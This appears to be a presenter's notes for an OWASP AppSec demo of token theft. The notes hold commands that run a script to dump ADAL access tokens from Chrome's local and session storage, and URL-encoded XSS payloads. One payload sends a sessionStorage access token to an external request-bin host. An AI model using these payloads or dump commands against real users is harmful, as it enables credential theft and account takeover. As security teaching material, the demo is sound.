# Demo for OWASP AppSec

LocalStorage Dump Demo:

cd c:\Users\rafae\Developer\chromeStorageDump

node chromeStorageDump.js -k adal.access.token "C:\Users\rafae\AppData\Local\Google\Chrome\User Data\Default\Session Storage"
node chromeStorageDump.js -k adal.access.token "C:\Users\rafae\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb"

XSS Part 1: 

https://trashbin2.azurewebsites.net/1j4moaj1?inspect

https://messageb.azurewebsites.net/bypass?name=%3Ciframe%20src%3Djavascript:alert(%22Hi_OWASP_APPSEC%22)%3E%3Cp%3ERafael%3C%2Fp%3E%3C%2Fiframe%3E

XSS Part 2: 

https://messageb.azurewebsites.net/bypass?name=%3Ciframe%20src%3Djavascript:window.location.href%3D%27https:%2F%2Ftrashbin2.azurewebsites.net%2F1j4moaj1%3Ftoken%3D%27%2Bwindow.sessionStorage.getItem(%22adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e%22)%3E%3C%2Fiframe%3E